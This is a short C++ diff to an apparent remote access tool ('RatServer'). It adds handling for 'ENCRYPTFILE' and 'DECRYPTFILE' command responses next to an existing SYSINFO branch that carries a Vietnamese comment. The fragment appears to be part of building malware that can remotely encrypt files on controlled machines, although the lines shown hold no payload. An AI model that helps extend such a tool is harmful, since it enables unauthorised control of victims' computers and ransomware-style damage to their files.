@@ -318,6 +318,10 @@ void RatServer::HandleCommand(const std::string& input) {
     else if (input == "SYSINFO") { // Thêm nhánh xử lý phản hồi lệnh SYSINFO
         SysInfo();
     }
+
+    else if (input.rfind("ENCRYPTFILE ", 0) == 0 || input.rfind("DECRYPTFILE ", 0) == 0) {
+        ReceiveStatus();
+    }
 }
 
 void RatServer::ListFile() {
